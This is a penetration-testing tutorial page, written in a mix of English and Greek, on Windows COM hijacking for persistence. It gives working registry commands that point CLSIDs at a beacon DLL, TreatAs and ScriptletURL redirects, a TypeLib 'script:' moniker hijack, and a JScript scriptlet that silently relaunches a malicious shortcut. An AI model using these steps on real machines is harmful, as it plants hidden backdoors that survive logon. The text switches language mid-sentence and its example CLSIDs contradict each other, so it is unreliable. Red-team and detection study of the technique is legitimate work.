# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Searching non-existent COM components

As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistence mechanism**. Using `procmon` it's easy to find searched COM registries that don't exist yet and could be created by an attacker. Classic filters:

- **RegOpenKey** operations.
- where the _Result_ is **NAME NOT FOUND**.
- and the _Path_ ends with **InprocServer32**.

Useful variations during hunting:

- Also look for missing **`LocalServer32`** keys. Some COM classes are διακομιστές εκτός διεργασίας and will launch an attacker-controlled EXE instead of a DLL.
- Search for **`TreatAs`** and **`ScriptletURL`** registry operations in addition to `InprocServer32`. Πρόσφατο detection περιεχόμενο και αναλύσεις malware τα αναφέρουν συχνά επειδή είναι πολύ πιο σπάνια από τις κανονικές καταχωρήσεις COM και επομένως υψηλού σήματος.
- Copy the legitimate **`ThreadingModel`** from the original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` when cloning a registration into HKCU. Using the wrong model often breaks ενεργοποίηση and makes the hijack more noticeable.
- On 64-bit systems inspect both 64-bit and 32-bit views (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` and `HKLM\Software\Classes\WOW6432Node`) because 32-bit applications may resolve a different COM registration.

Once you have decided which non-existent COM to impersonate, execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Συστατικά COM του Task Scheduler που μπορούν να υποκλαπούν

Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Ελέγχοντας την έξοδο μπορείτε να επιλέξετε ένα που θα εκτελείται, για παράδειγμα, **κάθε φορά που ένας χρήστης συνδέεται**.

Τώρα, αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\CLASSES\ROOT\CLSID** και στο HKLM και HKCU, συνήθως θα διαπιστώσετε ότι η τιμή δεν υπάρχει στο HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Στη συνέχεια, μπορείτε απλά να δημιουργήσετε την HKCU entry και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` επιτρέπει σε ένα CLSID να προσομοιωθεί από ένα άλλο. Από επιθετική σκοπιά αυτό σημαίνει ότι μπορείτε να αφήσετε το αρχικό CLSID ανέπαφο, να δημιουργήσετε ένα δεύτερο ανά χρήστη CLSID που δείχνει σε `scrobj.dll`, και στη συνέχεια να ανακατευθύνετε το πραγματικό COM αντικείμενο στο κακόβουλο με `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Αυτό είναι χρήσιμο όταν:

- η στοχευόμενη εφαρμογή ήδη δημιουργεί ένα σταθερό CLSID κατά τη σύνδεση ή κατά την εκκίνηση της εφαρμογής
- θέλετε ανακατεύθυνση μόνο μέσω μητρώου αντί για αντικατάσταση του αρχικού `InprocServer32`
- θέλετε να εκτελέσετε ένα τοπικό ή απομακρυσμένο `.sct` scriptlet μέσω της τιμής `ScriptletURL`

Παράδειγμα workflow (διασκευασμένο από το δημόσιο Atomic Red Team tradecraft και παλαιότερες έρευνες για κατάχρηση του COM registry):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` διαβάζει την τιμή `ScriptletURL` και εκτελεί το αναφερόμενο `.sct`, οπότε μπορείτε να διατηρήσετε το payload ως τοπικό αρχείο ή να το τραβήξετε απομακρυσμένα μέσω HTTP/HTTPS.
- `TreatAs` είναι ιδιαίτερα χρήσιμο όταν η αρχική εγγραφή COM είναι πλήρης και σταθερή στο HKLM, επειδή χρειάζεστε μόνο μια μικρή ανά χρήστη ανακατεύθυνση αντί να κατοπτρίσετε ολόκληρο το δέντρο.
- Για επικύρωση χωρίς να περιμένετε το φυσικό trigger, μπορείτε να δημιουργήσετε χειροκίνητα το ψεύτικο ProgID/CLSID με `rundll32.exe -sta <ProgID-or-CLSID>` αν η στοχευόμενη κλάση υποστηρίζει STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) ορίζουν διεπαφές COM και φορτώνονται μέσω του `LoadTypeLib()`. Όταν ένας COM server στιγμιοτυπείται, το OS μπορεί επίσης να φορτώσει την αντίστοιχη TypeLib συμβουλευόμενο κλειδιά μητρώου υπό `HKCR\TypeLib\{LIBID}`. Εάν η διαδρομή της TypeLib αντικατασταθεί με έναν **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet όταν η TypeLib επιλυθεί — παράγοντας stealthy persistence που ενεργοποιείται όταν αγγίζονται κοινά components.

Αυτό έχει παρατηρηθεί εναντίον του Microsoft Web Browser control (συχνά φορτωμένο από το Internet Explorer, εφαρμογές που ενσωματώνουν WebBrowser, και ακόμη και `explorer.exe`).

### Steps (PowerShell)

1) Εντοπίστε την TypeLib (LIBID) που χρησιμοποιείται από ένα CLSID με υψηλή συχνότητα χρήσης. Παράδειγμα CLSID που συχνά καταχράται από malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Κατευθύνετε τη διαδρομή TypeLib ανά χρήστη σε ένα τοπικό scriptlet χρησιμοποιώντας την επωνυμία `script:` (δεν απαιτούνται δικαιώματα διαχειριστή):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop a minimal JScript `.sct` που επανεκκινεί το κύριο payload σας (π.χ. ένα `.lnk` που χρησιμοποιείται από την αρχική αλυσίδα):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Εκκίνηση – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το WebBrowser control, ή ακόμα και η συνήθης δραστηριότητα του Explorer θα φορτώσει το TypeLib και θα εκτελέσει το scriptlet, επανενεργοποιώντας την αλυσίδα σας κατά το logon/reboot.

Καθαρισμός
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Σημειώσεις
- Μπορείτε να εφαρμόσετε την ίδια λογική και σε άλλα υψηλής συχνότητας COM components· πάντα προσδιορίζετε πρώτα το πραγματικό `LIBID` από `HKCR\CLSID\{CLSID}\TypeLib`.
- Σε συστήματα 64-bit μπορείτε επίσης να συμπληρώσετε το υποκλειδί `win64` για 64-bit καταναλωτές.

## Αναφορές

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
